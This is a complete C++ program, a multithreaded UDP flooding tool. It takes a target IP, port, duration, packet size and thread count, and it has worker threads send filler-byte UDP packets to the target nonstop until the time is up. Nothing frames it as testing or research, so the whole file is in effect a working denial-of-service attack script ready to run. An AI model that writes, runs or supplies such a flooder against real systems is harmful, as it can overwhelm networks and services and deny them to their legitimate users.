#include <iostream>

#include <string>

#include <cstring>

#include <sys/socket.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include <unistd.h>

#include <chrono>

#include <thread>

#include <vector>

#include <stdexcept>

#include <cstdlib>

#include <atomic> // For a flag to control the worker loop

// Global Atomic flag to gracefully end the worker threads.

std::atomic<bool> running(true);

void send_udp_packet(const std::string& ip, int port, int packet_size) {

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    if (sockfd == -1) {

         throw std::runtime_error("Failed to create socket");

    }

    sockaddr_in server_addr;

    server_addr.sin_family = AF_INET;

    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr) <= 0) {

        close(sockfd);

        throw std::runtime_error("Invalid IP address");

    }

    

    char* buffer = new char[packet_size];

    memset(buffer, 'A', packet_size); // Fill with 'A' for simplicity

    if (sendto(sockfd, buffer, packet_size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1)

    {

        delete[] buffer;

        close(sockfd);

        throw std::runtime_error("Failed to send packet");

    }

    

    delete[] buffer;

    close(sockfd);

}

void worker_thread(const std::string& ip, int port, int packet_size) {

    try {

        while (running) {

                send_udp_packet(ip, port, packet_size);

            }

        

        

    } catch (const std::runtime_error& e) {

        std::cerr << "Thread error: " << e.what() << std::endl;

    }

}

int main(int argc, char* argv[]) {

    if (argc != 6) {

        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <TIME> <packet_size> <THREAD_COUNT>\n";

        return 1;

    }

    std::string ip = argv[1];

    int port = std::stoi(argv[2]);

    int time = std::stoi(argv[3]);

    int packet_size = std::stoi(argv[4]);

    int thread_count = std::stoi(argv[5]);

    std::vector<std::thread> threads;

    for (int i = 0; i < thread_count; ++i) {

        threads.emplace_back(worker_thread, ip, port, packet_size);

    }

    std::this_thread::sleep_for(std::chrono::seconds(time));

    running = false; // Signal threads to stop

    for (auto& thread : threads) {

        thread.join();

    }

    

    std::cout << "Packets sent continuously for " << time << " seconds.\n";

    return 0;

}